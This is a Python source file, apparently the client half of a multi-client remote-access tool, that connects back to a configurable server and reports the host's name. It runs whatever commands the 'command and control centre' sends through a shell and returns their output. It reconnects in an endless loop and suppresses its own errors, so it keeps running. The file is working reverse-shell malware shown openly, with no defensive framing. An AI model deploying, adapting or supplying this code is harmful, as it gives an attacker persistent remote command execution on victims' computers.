#------------------------------------------PYTHON-3-MULTI-CLIENT-(CLIENT-SCRIPT)-IMPLEMENTATION-------------------------------------------

import socket
import struct
import subprocess
import os
import time
import sys

# creating the client class & initializing the instance variables
class client:
    def __init__(self):
        self.server_host = ""                                # Server's ip here!
        self.server_port = 4321                              # legitimate server script's port no.
        self.socket = None

# terminating the connection
    def terminate_conn(self):
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception:
                pass
        sys.exit(0)
        return

    def socket_create(self):
        self.socket = socket.socket()
        
# This method is for establishing the connection with server
    def socket_connect(self):
        try:
            self.socket.connect((self.server_host, self.server_port))
        except socket.error:
            time.sleep(3)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error:
            raise
        return

# sending the output to command and control centre
    def send_to_CnC(self, output_str):
        send_message = str.encode(output_str + str(os.getcwd())+'>')
        self.socket.send(struct.pack('>I', len(send_message)) + send_message)
        return

# receiving the commands from server
    def receive_commands(self):
        try:
            self.socket.recv(20)
        except Exception:
            None
            return
        pwd = str.encode(str(os.getcwd())+'>')
        self.socket.send(struct.pack('>I', len(pwd)) + pwd)

# infinite loop to maintain the connection
        while True:
            output_str = None
            data = self.socket.recv(10000)
            if data == b'':
                break
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception:
                    pass
                else:
                    output_str = ""
            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break

    # Execution of commands in target client's shell
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode('utf-8', errors='replace')
                except Exception:
                    pass
            if output_str is not None:
                    self.send_to_CnC(output_str)
        self.socket.close()
        return

# main function consists of methods under client class
def main():
    Client = client()
    Client.socket_create()
    while True:
        try:
            Client.socket_connect()
        except Exception:
            time.sleep(3)
        else:
            break
    try:
        Client.receive_commands()
    except Exception:
        pass
    Client.socket.close()
    return

# function call
if __name__ == '__main__':
    while True:
        main()
